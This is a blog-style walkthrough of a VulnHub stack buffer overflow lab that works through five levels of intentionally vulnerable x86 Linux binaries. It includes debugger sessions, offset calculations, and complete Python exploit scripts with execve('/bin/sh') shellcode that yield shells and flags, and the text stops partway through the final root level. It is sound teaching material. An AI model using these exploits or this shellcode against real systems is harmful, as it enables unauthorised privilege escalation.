---
layout: post
title: Intro to Stack Buffer Overflow
categories: vulnhub
permalink: /introtobof
---

<pre style="font-size: 12.8px; color: white;display: inline-block; border:0px solid Black; background: #fffff; overflow: auto; overflow-y: hidden;"><code>
 _____  ____  _____  _____  __ ___ _____  __ __  _____  _____  ____   _____  __  __ 
/  ___>/    \/  _  \/     \|  |  //  _  \/  |  \/   __\/   __\/  _/  /  _  \/   /  \
|___  |\-  -/|  _  ||  |--||  _ < |  |  |\  |  /|   __||   __||  |---|  |  ||  /\  |
<_____/ |__| \__|__/\_____/|__|__\\_____/ \___/ \_____/\__/   \_____/\_____/\__/\__/

</code>
</pre>

# Overview:

The [IntroToStackOverflow][1] virtual machine is an introduction to exploting stack based buffer overflow vulnerability in linux x86 binaries.
The pre-compiled binaries you will find on the virtual machine are without any memory address modification prevention flags. This would mean the all memory addresses would be static and protections such as NX, ASLR, DEP, Canary, etc would not be present. After all, this is just to demonstrate the basics of exploiting stack based buffer overflows.

There are 5 levels with starting level at 0 which is meant to show you how the `EIP` register is overwritten. The `EIP` is the registry which is what will be controlled to point to the memory address which the program will execute. Therefore, execution of malicious shellcode being possible.

For example, getting a reverse shell or spawning a bash shell with elevated privileges.

I should say that the explanations I will provide, assume you are familiar at least to some extend with memory allocation, stack and binary exploitation. 

# Level 0 -> Level 1:

Level 0 is created to create an easy way to understand how the `EIP` register gets overwritten. When the binary is executed it will assign a variable of 32 characters array which will act as the buffer. There is a statement which checks if the user input is 4 "B"s and if so then it will execute `/bin/sh`.

<code>level0@kali:~$ cat levelOne.c</code>
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {

    uid_t uid = geteuid();

    setresuid(uid, uid, uid);

    long key = 0x12345678;
    char buf[32];

    strcpy(buf, argv[1]);

    printf("Buf is: %s\n", buf);
    printf("Key is: 0x%08x\n", key);

    if(key == 0x42424242) {
        execve("/bin/sh", 0, 0);
    }
    else {
        printf("%s\n", "Sorry try again...");
    }

    return 0;
}
```
A `strcpy()` function is used to obtain the user input and store it in the `buf` array. However, since the `strcpy()` function is actually problematic, it will continue to copy information infinitely to the stack therefore overflowing it.

The output of the program would also display what is the value of the `EIP` register. This is rather a bonus of an easier representation of how the `EIP` register would look in a debugger.

Provide the program with 32 "A" <code>./levelOne AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>
The following output should be displayed:

```shell
level0@kali:~$ ./levelOne AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Key is: 0x12345600
Sorry try again...
```

The "**key**" value is `0x12345600` and is not what the program expects which should be `0x42424242`. Let's provide 4 more "A".

```shell
level0@kali:~$ ./levelOne AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Key is: 0x41414141
Sorry try again...
```

Now the key shows a result of **AAAA** which the `EIP` is pointing at. If the 4 "A"s are replaced with "B"s, the `key` variable would be equal to if statement in the code and a shell would be dropped as `level1` user.

```bash
level0@kali:~$ ./levelOne AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Key is: 0x42424242
$ id
uid=1001(level1) gid=1000(level0) groups=1000(level0)
$ cat /home/level1/level1.txt
d13e3e4d[REDACTED]
```

# Level 1 -> Level 2:

A quite use python script [gdb-peda][2] will be used throughtout this walkthrough and it intergrates with `gdb`. Finding possible `jmp` addresses in the binaries would be simpler using gdb-peda.

Follow the instructions in the github page to set up the tool.

Load the compiled binary in gdb <code>$gdb levelTwo</code>.
Now let's show all functions that the program has.

```bash
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x00001000  _init
0x00001030  setresuid@plt
0x00001040  printf@plt
0x00001050  geteuid@plt
0x00001060  strcpy@plt
0x00001070  __libc_start_main@plt
0x00001080  execve@plt
0x00001090  setuid@plt
0x000010a0  __cxa_finalize@plt
0x000010b0  _start
0x000010f0  __x86.get_pc_thunk.bx
0x00001100  deregister_tm_clones
0x00001140  register_tm_clones
0x00001190  __do_global_dtors_aux
0x000011e0  frame_dummy
0x000011e5  __x86.get_pc_thunk.dx
0x000011e9  spawn
0x00001224  hello
0x00001264  main
0x000012d0  __libc_csu_init
0x00001330  __libc_csu_fini
0x00001334  _fini
```

Addresses of interest are:
<ul>
    <li>0x000011e9  spawn</li>
    <li>0x00001224  hello</li>
    <li>0x00001264  main</li>
</ul>

Checking the `spawn` would point to couple of interesting calls. There is a call to `setuid()` which would set the UID of the user who owns the binary. The second interesting one is `execve()` which from the binary at level 0 will simply spawn `/bin/sh`.

```bash
gdb-peda$ pd spawn
Dump of assembler code for function spawn:
   0x000011e9 <+0>:	push   ebp
   0x000011ea <+1>:	mov    ebp,esp
   0x000011ec <+3>:	push   ebx
   0x000011ed <+4>:	sub    esp,0x4
   0x000011f0 <+7>:	call   0x10f0 <__x86.get_pc_thunk.bx>
   0x000011f5 <+12>:	add    ebx,0x2e0b
   0x000011fb <+18>:	sub    esp,0xc
   0x000011fe <+21>:	push   0x0
->   0x00001200 <+23>:	call   0x1090 <setuid@plt>
   0x00001205 <+28>:	add    esp,0x10
   0x00001208 <+31>:	sub    esp,0x4
   0x0000120b <+34>:	push   0x0
   0x0000120d <+36>:	push   0x0
   0x0000120f <+38>:	lea    eax,[ebx-0x1ff8]
   0x00001215 <+44>:	push   eax
->   0x00001216 <+45>:	call   0x1080 <execve@plt>
   0x0000121b <+50>:	add    esp,0x10
   0x0000121e <+53>:	nop
   0x0000121f <+54>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x00001222 <+57>:	leave
   0x00001223 <+58>:	ret
End of assembler dump.
```

Remember that after execution of the program the addresses will change due to the libraries and such being loaded.

Create a cyclic pattern using gdb-peda and provide the output as the argument to the program.

```bash
gdb-peda$ pattern_create 64
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH'

[----------------------------------registers-----------------------------------]
EAX: 0x47 ('G')
EBX: 0x413b4141 ('AA;A')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xffffd580 --> 0x2
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x41412941 ('A)AA')
ESP: 0xffffd530 ("AA0AAFAAbAA1AAGAAcAA2AAH")
-> EIP: 0x61414145 ('EAAa')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61414145
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 ("AA0AAFAAbAA1AAGAAcAA2AAH")
0004| 0xffffd534 ("AFAAbAA1AAGAAcAA2AAH")
0008| 0xffffd538 ("bAA1AAGAAcAA2AAH")
0012| 0xffffd53c ("AAGAAcAA2AAH")
0016| 0xffffd540 ("AcAA2AAH")
0020| 0xffffd544 ("2AAH")
0024| 0xffffd548 --> 0xffffd600 ("0cUV@D\376\367\f\326\377\377P\331\377\367\002")
0028| 0xffffd54c --> 0x3e9
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
-> 0x61414145 in ?? ()
```

Gdb-peda will then output in a friendly way the allocation of the stack and all memory addresses in the registers. The `EIP` register is shown that is pointing to address `0x61414145`. Since gdb-peda is able to grab the value in ASCII format in the `EIP`, it is easy to spot that the 4 bytes are likely from the cyclic pattern.

Cyclic patterns are used to generate unique non-repeating values which could be easily identified when trying to find the offset.

```bash
gdb-peda$ pattern_offset 0x61414145
1631666501 found at offset: 36
```

The offset is at 36 bytes, so assuming 4 more would overwrite the `EIP` register and make it user controllable.

```bash
gdb-peda$ r $(python2 -c 'print "A" * 36 + "B" * 4')
[----------------------------------registers-----------------------------------]
EAX: 0x2f ('/')
EBX: 0x41414141 ('AAAA')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xffffd5a0 --> 0x2
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd550 --> 0xffffd700 --> 0x3e9
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd550 --> 0xffffd700 --> 0x3e9
0004| 0xffffd554 --> 0x3e9
0008| 0xffffd558 --> 0x3e9
0012| 0xffffd55c --> 0x56556289 (<main+37>:	mov    DWORD PTR [ebp-0x1c],eax)
0016| 0xffffd560 --> 0xf7fa83fc --> 0xf7fa9200 --> 0x0
0020| 0xffffd564 --> 0x56559000 --> 0x3efc
0024| 0xffffd568 --> 0xffffd640 --> 0xffffd7af ("SHELL=/bin/bash")
0028| 0xffffd56c --> 0x3e9
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

Providing 4 more bytes of B character, shows that `EIP` is controllable at 40 bytes.

Run the program once inside gdb-peda and crash it, then obtain the address of the `spawn` function.
The address should be as follows after the first run of the program.

```bash
gdb-peda$ pd spawn
Dump of assembler code for function spawn:
   0x565561e9 <+0>:	push   ebp
   0x565561ea <+1>:	mov    ebp,esp
   0x565561ec <+3>:	push   ebx
   0x565561ed <+4>:	sub    esp,0x4
   0x565561f0 <+7>:	call   0x565560f0 <__x86.get_pc_thunk.bx>
   0x565561f5 <+12>:	add    ebx,0x2e0b
   0x565561fb <+18>:	sub    esp,0xc
   0x565561fe <+21>:	push   0x0
   0x56556200 <+23>:	call   0x56556090 <setuid@plt>
   0x56556205 <+28>:	add    esp,0x10
   0x56556208 <+31>:	sub    esp,0x4
   0x5655620b <+34>:	push   0x0
   0x5655620d <+36>:	push   0x0
   0x5655620f <+38>:	lea    eax,[ebx-0x1ff8]
   0x56556215 <+44>:	push   eax
   0x56556216 <+45>:	call   0x56556080 <execve@plt>
   0x5655621b <+50>:	add    esp,0x10
   0x5655621e <+53>:	nop
   0x5655621f <+54>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556222 <+57>:	leave
   0x56556223 <+58>:	ret
End of assembler dump.
```

Take the `ebp` address `0x565561e9` which is the address at which the function gets called. With the information so far, a working python script can be written to exploit the binary and use the `spawn` as our injection point.

One important step to note is that the memory of the `spawn` function needs to be converted to little endian format so that the CPU can understand it.

A complete python exploit would be as follows:

```python
#!/usr/bin/env python2
import struct

junk = "A" * 36
eip = struct.pack("<I", 0x565561e9) # Pack the spawn() mem addr in little endian

payload = junk + eip
print payload
```

The exploit can then be provided as user input to the program and exploit it.

```bash
level1@kali:~$ ./levelTwo $(python2 exploit.py)
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�aUV
$ id
uid=1002(level2) gid=1001(level1) groups=1001(level1)
$ cat /home/level2/level2.txt
d658dfc[REDACTED]
```

# Level 2 -> Level 3:

The complexity of the binary is increased at level 2 slightly.
Let's debug the program.

Load the `levelThree` binary in gdb-peda and list all the functions as was done in the previous challenges.

```bash
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x00001000  _init
0x00001030  setresuid@plt
0x00001040  printf@plt
0x00001050  geteuid@plt
0x00001060  strcpy@plt
0x00001070  __libc_start_main@plt
0x00001080  __cxa_finalize@plt
0x00001090  _start
0x000010d0  __x86.get_pc_thunk.bx
0x000010e0  deregister_tm_clones
0x00001120  register_tm_clones
0x00001170  __do_global_dtors_aux
0x000011c0  frame_dummy
0x000011c5  __x86.get_pc_thunk.dx
0x000011c9  overflow
0x00001212  main
0x00001280  __libc_csu_init
0x000012e0  __libc_csu_fini
0x000012e4  _fini
```

There is a function called `overflow` at address `0x000011c9`. Examine the assembly code of it.

```bash
gdb-peda$ pd overflow
Dump of assembler code for function overflow:
   0x000011c9 <+0>:	push   ebp
   0x000011ca <+1>:	mov    ebp,esp
   0x000011cc <+3>:	push   ebx
   0x000011cd <+4>:	sub    esp,0x104
   0x000011d3 <+10>:	call   0x10d0 <__x86.get_pc_thunk.bx>
   0x000011d8 <+15>:	add    ebx,0x2e28
   0x000011de <+21>:	sub    esp,0x8
   0x000011e1 <+24>:	push   DWORD PTR [ebp+0x8]
   0x000011e4 <+27>:	lea    eax,[ebp-0x108]
   0x000011ea <+33>:	push   eax
->   0x000011eb <+34>:	call   0x1060 <strcpy@plt>
   0x000011f0 <+39>:	add    esp,0x10
   0x000011f3 <+42>:	sub    esp,0x8
   0x000011f6 <+45>:	lea    eax,[ebp-0x108]
   0x000011fc <+51>:	push   eax
   0x000011fd <+52>:	lea    eax,[ebx-0x1ff8]
   0x00001203 <+58>:	push   eax
   0x00001204 <+59>:	call   0x1040 <printf@plt>
   0x00001209 <+64>:	add    esp,0x10
   0x0000120c <+67>:	nop
   0x0000120d <+68>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x00001210 <+71>:	leave
   0x00001211 <+72>:	ret
End of assembler dump.
```

Here `strcpy()` function is used to get information from the user as input and gets printed as output. The `strcpy()` is shown at address `0x000011eb`.

```bash
gdb-peda$ pd main
Dump of assembler code for function main:
   0x00001212 <+0>:	lea    ecx,[esp+0x4]
   0x00001216 <+4>:	and    esp,0xfffffff0
   0x00001219 <+7>:	push   DWORD PTR [ecx-0x4]
   0x0000121c <+10>:	push   ebp
   0x0000121d <+11>:	mov    ebp,esp
   0x0000121f <+13>:	push   esi
   0x00001220 <+14>:	push   ebx
   0x00001221 <+15>:	push   ecx
   0x00001222 <+16>:	sub    esp,0x1c
   0x00001225 <+19>:	call   0x10d0 <__x86.get_pc_thunk.bx>
   0x0000122a <+24>:	add    ebx,0x2dd6
   0x00001230 <+30>:	mov    esi,ecx
   0x00001232 <+32>:	call   0x1050 <geteuid@plt>
   0x00001237 <+37>:	mov    DWORD PTR [ebp-0x1c],eax
   0x0000123a <+40>:	sub    esp,0x4
   0x0000123d <+43>:	push   DWORD PTR [ebp-0x1c]
   0x00001240 <+46>:	push   DWORD PTR [ebp-0x1c]
   0x00001243 <+49>:	push   DWORD PTR [ebp-0x1c]
   0x00001246 <+52>:	call   0x1030 <setresuid@plt>
   0x0000124b <+57>:	add    esp,0x10
   0x0000124e <+60>:	mov    eax,DWORD PTR [esi+0x4]
   0x00001251 <+63>:	add    eax,0x4
   0x00001254 <+66>:	mov    eax,DWORD PTR [eax]
   0x00001256 <+68>:	sub    esp,0xc
   0x00001259 <+71>:	push   eax
   0x0000125a <+72>:	call   0x11c9 <overflow>
   0x0000125f <+77>:	add    esp,0x10
   0x00001262 <+80>:	mov    eax,0x0
   0x00001267 <+85>:	lea    esp,[ebp-0xc]
   0x0000126a <+88>:	pop    ecx
   0x0000126b <+89>:	pop    ebx
   0x0000126c <+90>:	pop    esi
   0x0000126d <+91>:	pop    ebp
   0x0000126e <+92>:	lea    esp,[ecx-0x4]
   0x00001271 <+95>:	ret
```

The function `overflow()` is called but before that a call to set the UID to the user who owns the binary is made, that is `level3`.

So what needs to be done is, overflow the `EIP` register, find the offset of the buffer... and then...

The slight complexity of the binary is found here. comparing the previous challenges with `level3` shows that at `level3` there is no function to spawn a shell. This would require a shellcode be provided supplied by the user.

Let's create a pattern of `300` characters long and send to the binary to overflow the `EIP` register and find out the offset.

```bash
gdb-peda$ pattern_create 300
'AAA%AAsAABAA$AAnAACAA-AA---SNIP---'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA---SNIP---'

[----------------------------------registers-----------------------------------]
EAX: 0x132
EBX: 0x25413225 ('%2A%')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xffffd490 --> 0x2
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x64254148 ('HA%d')
ESP: 0xffffd440 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
EIP: 0x41332541 ('A%3A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41332541
[------------------------------------stack-------------------------------------]
0000| 0xffffd440 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0004| 0xffffd444 ("eA%4A%JA%fA%5A%KA%gA%6A%")
0008| 0xffffd448 ("A%JA%fA%5A%KA%gA%6A%")
0012| 0xffffd44c ("%fA%5A%KA%gA%6A%")
0016| 0xffffd450 ("5A%KA%gA%6A%")
0020| 0xffffd454 ("A%gA%6A%")
0024| 0xffffd458 ("%6A%")
0028| 0xffffd45c --> 0x300
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 in ?? ()
```

The `EIP` register was successfully overwritten and now the offset.

```bash
gdb-peda$ pattern_offset 0x41332541
1093870913 found at offset: 268
```

Following the above statement which mentions the binary does not have a function which creates a shell instance, this means that in such cases a `jmp` call must be found. In particular one that makes the program jump back to the stack pointer - `ESP`. Such calls are called `jmp esp`. Some calls might be at `ebp` or `ecx` or `eax`, this really depends on where the user provided data is stored.

Using gdb-peda, finding a call such as `jmp esp` is easilly found with the following command: <code>jmpcall</code>.

Since the offset is identified, a `jmp esp` call can be looked up.

```bash
gdb-peda$ jmpcall esp
0x56557043 : jmp esp
0x56558043 : jmp esp
```

Development of an exploit can now begin.

```python
#!/usr/bin/env python2
import struct

ffset = "A" * 268 # offset = 268 (junk)
eip = 0x56558043 # jmpcall : 0x56558043 jmp esp;
ret = struct.pack("<I", eip)
```

Since the program doesn't have its own `execve()` method to launch `/bin/sh` for example, we need to provide our own.

A shellcode to spawn `/bin/sh` can be found online. One place is [exploit-db.com](https://www.exploit-db.com/shellcodes/46809).
In exploit development there is one hex code known as a `NOPSLED` also known as no operation instruction. 

It simply tells a program to not do anything and proceed further in memory until it finds a valid address to execute. This is typically used to allign the stack so that after a `jmp esp` call a program can simply go straight to the shellcode.

With the information so far, a final exploit can be developed which should look something like the following:

```python
#!/usr/bin/env python2
import struct

offset = "A" * 268 # offset = 268 (junk)
eip = 0x56558043 # jmpcall : 0x56558043 jmp esp;
ret = struct.pack("<I", eip) # pack the jmpcall in little endian

# slide to shellcode
nops = "\x90" * 10
shellcode = (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
) # execve("/bin/sh")

print offset + ret + nops + shellcode
```

Provide the final exploit as the user input data to the `levelThree` binary and get access as `level3` user.

```bash
level2@kali:~$ ./levelThree $(./exploit.py)
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC�UV����������1�Ph//shh/bin��PS��
                                                       
$ id; cat /home/level3/level3.txt
uid=1003(level3) gid=1002(level2) groups=1002(level2)
2c41d9ef668[REDACTED]
```

# Level 3 -> Level 4:

Obtaining access as `level4 ` user is almost the same as getting access to `level3`, where the only difference here would the offset. 

Therefore, I will not be provided much details regarding the steps of identifing offset and related. 

It is good practice to attempt and replicate the steps using the information from the previous challenges.



Idenfing the offset at `level4`.

```bash
gdb-peda$ pattern_create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa---SNIP---'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA---SNIP---'

[----------------------------------registers-----------------------------------]
EAX: 0x6a ('j')
EBX: 0x41412d41 ('A-AA')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xffffd6d0 --> 0x2
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x44414128 ('(AAD')
ESP: 0xffffd680 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x413b4141 ('AA;A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x413b4141
[------------------------------------stack-------------------------------------]
0000| 0xffffd680 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd684 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd688 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd68c ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd690 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd694 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd698 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd69c ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 in ?? ()
```

Using the previously gained information, the offset is adjusted.

```bash
gdb-peda$ pattern_offset 0x413b4141
1094402369 found at offset: 28
```

The final exploit should look like the following:

```python
#!/usr/bin/env python2
import struct

offset = "A" * 28 # offset = 268 (junk)
eip = 0x56558043 # jmpcall : 0x56558043 jmp esp;
ret = struct.pack("<I", eip) # pack the jmpcall in little endian

# slide to shellcode
nops = "\x90" * 10
shellcode = (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
) # execve("/bin/sh")

print offset + ret + nops + shellcode
```
```bash
level3@kali:~$ ./levelFour $(./exploit.py)
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAC�UV����������1�Ph//shh/bin��PS��
                                                                   
$ id; cat /home/level4/level4.txt
uid=1004(level4) gid=1003(level3) groups=1003(level3)
e879069[REDACTED]
```
# Level 4 -> Level 5 (root):

This is the hardest level and reason being is because the program does not have a `setreuid()` function used to obtain and set the UID to the owner of the binary. This could be observed in the previous challenges. Essentially, a `setreuid()` combined with a `execve()` functions have to be somehow added as shellcode to make the binary drop a shell as root.

Upon looking at the functions which the binary has, two would be the most interesting - `overflow` and `main`.

```bash
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x00001000  _init
0x00001030  printf@plt
0x00001040  gets@plt
0x00001050  __libc_start_main@plt
0x00001060  __cxa_finalize@plt
0x00001070  _start
0x000010b0  __x86.get_pc_thunk.bx
0x000010c0  deregister_tm_clones
0x00001100  register_tm_clones
0x00001150  __do_global_dtors_aux
0x000011a0  frame_dummy
0x000011a5  __x86.get_pc_thunk.dx
0x000011a9  overflow
0x000011ff  main
0x0000121b  __x86.get_pc_thunk.ax
0x00001220  __libc_csu_init
0x00001280  __libc_csu_fini
0x00001284  _fini
```

A `gets()` function is used in the `overflow` function which similar to `strcpy()` is vulnerable to the same overflow problem and will also continuesly copy data to the stack until the program crashes.

```bash
gdb-peda$ pd overflow
Dump of assembler code for function overflow:
   0x000011a9 <+0>:	push   ebp
   0x000011aa <+1>:	mov    ebp,esp
   0x000011ac <+3>:	push   ebx
   0x000011ad <+4>:	sub    esp,0x14
   0x000011b0 <+7>:	call   0x10b0 <__x86.get_pc_thunk.bx>
   0x000011b5 <+12>:	add    ebx,0x2e4b
   0x000011bb <+18>:	sub    esp,0x8
   0x000011be <+21>:	lea    eax,[ebx-0x1ff8]
   0x000011c4 <+27>:	push   eax
   0x000011c5 <+28>:	lea    eax,[ebx-0x1fe5]
   0x000011cb <+34>:	push   eax
   0x000011cc <+35>:	call   0x1030 <printf@plt>
   0x000011d1 <+40>:	add    esp,0x10
   0x000011d4 <+43>:	sub    esp,0xc
   0x000011d7 <+46>:	lea    eax,[ebp-0xc]
   0x000011da <+49>:	push   eax
 -> 0x000011db <+50>:	call   0x1040 <gets@plt>
   0x000011e0 <+55>:	add    esp,0x10
   0x000011e3 <+58>:	sub    esp,0x8
   0x000011e6 <+61>:	lea    eax,[ebp-0xc]
   0x000011e9 <+64>:	push   eax
   0x000011ea <+65>:	lea    eax,[ebx-0x1fe2]
   0x000011f0 <+71>:	push   eax
   0x000011f1 <+72>:	call   0x1030 <printf@plt>
   0x000011f6 <+77>:	add    esp,0x10
   0x000011f9 <+80>:	nop
   0x000011fa <+81>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x000011fd <+84>:	leave
   0x000011fe <+85>:	ret
End of assembler dump.
```

The call to `gets()` is found at `0x000011db`. 

The `main` function's functionality is as follows:

```bash
gdb-peda$ pd main
Dump of assembler code for function main:
   0x000011ff <+0>:	push   ebp
   0x00001200 <+1>:	mov    ebp,esp
   0x00001202 <+3>:	and    esp,0xfffffff0
   0x00001205 <+6>:	call   0x121b <__x86.get_pc_thunk.ax>
   0x0000120a <+11>:	add    eax,0x2df6
   0x0000120f <+16>:	call   0x11a9 <overflow>
   0x00001214 <+21>:	mov    eax,0x0
   0x00001219 <+26>:	leave
   0x0000121a <+27>:	ret
End of assembler dump.
```

It is simple function which executes the `overflow` function.

One thing to note here is, as mentioned above, that there is neither an `execve()` nor a `setreuid()` functions are provided. Therefore, a shellcode which uses both would be ideal so that a shell is spawned as root.

Such shellcode can be obtained from [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-399.php) or another place of your choice.

To start developing the exploit, let's first crash the program and find the offset.

```bash
gdb-peda$ pattern_create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)A---SNIP---'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAE---SNIP---'
Starting program: /home/level4/levelFive 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAA---SNIP---'
Enter your input:
Buf:
[Inferior 1 (process 2200) exited normally]
Warning: not running
```

A small bump in the road with binary is that the program will wait for the user's input upon launching it. This issue can be bypassed using a python library known as `pwntools`.

Let's re-run the program and provide the 300 bytes long string as the user input when requested.

```bash
Starting program: /home/level4/levelFive 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAA---SNIP---'
Enter your input: 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAA---SNIP---'
Buf: 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAA---SNIP---'

[----------------------------------registers-----------------------------------]
EAX: 0x134
EBX: 0x41424141 ('AABA')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xf7fa8000 --> 0x1d9d6c
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x41412441 ('A$AA')
ESP: 0xffffd5f0 ("AA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAd---SNIP---"...)
EIP: 0x4341416e ('nAAC')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x4341416e
[------------------------------------stack-------------------------------------]
0000| 0xffffd5f0 ("AA-AA(AADAA;AA)---SNIP---"..)
0004| 0xffffd5f4 ("A(AADAA;AA)---SNIP---"...)
0008| 0xffffd5f8 ("DAA;AA)---SNIP---"...)
0012| 0xffffd5fc ("AA)---SNIP---"...)
0016| 0xffffd600 ("AEAAaAA0---SNIP---"...)
0020| 0xffffd604 ("aAA0AAFAAbAA1A---SNIP---"...)
0024| 0xffffd608 ("AAFAAbAA1AAGAA---SNIP---"...)
0028| 0xffffd60c ("AbAA1AAGAAcAA2A---SNIP---"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x4341416e in ?? ()
```

The program crashed which is good and `EIP` register is poiting to somewhere in the long string. One byte is actually missing so the offset would be 16. If in the final exploit there is 15 characters as the junk the exploit would break when a shell command is executed.

```bash
gdb-peda$ pattern_offset 0x4341416e
1128350062 found at offset: 15
```

As the offset is now found, a `jmp` call be identified. 

```bash
gdb-peda$ jmpcall
0x56556019 : call eax
0x565560ec : call eax
0x5655613d : call edx
0x56557067 : jmp [eax]
0x56557ff8 : call [ecx]
0x56558067 : jmp [eax]
```

Interestingly finding a `jmp esp` call was not available in the program itself, however, a `jmp esp` call be found in the ***libc*** library. This can be identified as follows:

```bash
gdb-peda$ jmpcall esp libc
0xf7dd0bb1 : jmp esp
0xf7dd4ff7 : jmp esp
0xf7dd7037 : jmp esp
0xf7f3f1b0 : call esp
0xf7f48b87 : call esp
0xf7f48bc3 : call esp
0xf7f48c07 : call esp
0xf7f547db : jmp esp
0xf7f55937 : jmp esp
0xf7f55b77 : call esp
0xf7f55b83 : call esp
0xf7f55c7b : call esp
0xf7f55d3f : call esp
0xf7f55e37 : call esp
0xf7f560f7 : call esp
0xf7f56103 : call esp
0xf7f5627f : jmp esp
0xf7f562f3 : call esp
0xf7f56323 : jmp esp
0xf7f563eb : jmp esp
